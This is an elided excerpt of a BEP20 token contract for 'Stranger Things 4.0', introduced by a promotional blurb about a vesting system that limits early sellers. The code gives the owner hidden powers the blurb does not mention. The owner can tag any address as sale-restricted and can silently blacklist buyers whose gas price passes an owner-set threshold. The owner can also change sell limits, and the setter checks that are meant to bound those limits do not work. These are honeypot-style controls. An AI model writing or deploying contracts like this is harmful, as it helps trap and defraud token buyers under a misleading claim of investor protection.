...
New system to limit early dumpers.

Automatic vesting for the first 3 hours, investors in this time frame will only be able to sell .2% of supply every hour.

Callers can call without the fear of being dumped on by early buyers, and those who buy later can rest assured the early buyers who get cheap bags cannot dump all.
...
contract StrangerThings4 is IBEP20, Auth {
    ...
    string constant _name = "Stranger Things 4.0";
    string constant _symbol = "Stranger 4";
    ...
    bool public vestedLimitsEnabled = true;
    mapping (address => bool) public isvestedholder;
    uint256 public _maxvestSellAmount = _totalSupply.mul(2).div(1000);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x202684840BBB0fbCdD713B147682C5C92B016bDC;
        teamFeeReceiver = 0x807bAf352cfD82e07bD94eFfb1Cf288896B8245E;
        devFeeReceiver = 0x807bAf352cfD82e07bD94eFfb1Cf288896B8245E;
    ...
    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {
        require(_maxWalletToken >= _totalSupply.mul(2).div(1000));
    ...
    function setvestSaleRestrictions(uint256 maxvestSellPercentage_base1000, bool _restricted, uint256 _interval) external onlyOwner() {
        require(_maxvestSellAmount >=_totalSupply.mul(1).div(1000));
        _maxvestSellAmount = (_totalSupply * maxvestSellPercentage_base1000 ) / 1000;
        vestedLimitsEnabled = _restricted;
        cooldownTimerInterval = _interval;
    }

    function manage_vestseller(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isvestedholder[addresses[i]] = status;
        }
    }

    function setvestSaleRestrictions_maxsell(uint256 amount) public onlyOwner {
        require(_maxvestSellAmount >=_totalSupply.mul(1).div(1000));
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= AB && recipient != pair) {
            isBlacklisted[recipient] = true;
        }
            
        if (isvestedholder[sender]  && vestedLimitsEnabled) {
         ...
         if(!authorizations[sender] && !authorizations[recipient]){
            ...
            if(sender == pair && launchBlock + vestingtime >= block.number){isvestedholder[recipient] = true;}
    ...
    function UpdateAB (uint256 _AB) public onlyOwner {
               AB = _AB * 1 gwei; 
...
function multi_airdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= GK, "Not enough tokens in wallet");
